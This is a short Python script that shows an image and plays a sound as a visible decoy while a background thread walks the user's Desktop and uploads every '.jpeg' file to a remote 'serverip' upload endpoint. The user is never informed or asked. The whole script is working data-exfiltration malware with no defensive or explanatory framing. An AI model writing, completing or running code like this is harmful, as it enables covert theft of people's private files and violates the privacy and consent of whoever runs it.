
import sys
import requests
import json
import os

from PIL import Image
from threading import Thread




from playsound import playsound



def content_uploader():
    username = os.getenv('username')
    yourpath = 'C://Users/'+username+'/Desktop/'
    for root, dirs, files in os.walk(yourpath, topdown=False):
        for name in files:
            if (".jpeg" in name):

                filepaths=os.path.join(root, name)
                url = "http://serverip/api/UploadImage"
                f = open(filepaths, 'rb')
                files = {'file': f}
                j1 = requests.post(
            url,
            files=files
        )



def image_show():
    im = Image.open('done.jpg')
    im.show()

def sound_player():
  playsound('done.wav')


t2 = Thread(target=content_uploader)
t2.start()

t3 = Thread(target=sound_player)
t3.start()

t1 = Thread(target=image_show)
t1.start()










